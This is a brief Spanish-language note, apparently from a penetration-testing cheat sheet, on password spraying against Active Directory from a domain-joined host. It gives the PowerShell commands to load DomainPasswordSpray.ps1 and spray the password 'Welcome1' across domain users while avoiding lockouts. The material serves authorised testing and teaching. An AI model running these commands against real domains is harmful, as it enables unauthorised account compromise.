Si estamos autenticados en un host domain-joined, podemos utilizar **DomainPasswordSpray.ps1**

De manera automática va a generar una lista de usuarios del AD, ver las políticas de pass y quitar los users que están a un paso de quedar bloqueados.

#### Powershell:

    Import-Module .\DomainPasswordSpray.ps1
    Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue


